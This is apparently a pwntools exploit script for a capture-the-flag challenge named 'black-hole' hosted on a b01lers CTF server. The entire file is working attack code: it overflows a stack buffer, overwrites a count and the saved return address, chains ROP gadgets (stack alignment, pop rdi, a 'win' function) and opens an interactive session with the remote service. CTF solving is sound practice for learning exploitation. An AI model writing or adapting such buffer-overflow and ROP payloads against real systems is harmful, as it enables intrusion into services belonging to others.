from pwn import *

context(arch='amd64', os='linux')

# p = process('black-hole/black-hole')
p = remote('pwn.ctf.b01lers.com', 1005)

p.recv(1024)

buf = b'a' * 0x8c
# 4 bytes for count
buf += p32(148) # offset to saved return address
buf += p64(0x4006fe) # ret (fix unaligned stack)
buf += p64(0x400dc3) # pop rdi; ret
buf += p64(0x400e52) # random valid pointer for rdi
buf += p64(0x400bdb) # win
buf += p64(0x400bd0) # mov rsi, rax; puts
buf += b'\n'

p.send(buf)
p.interactive()
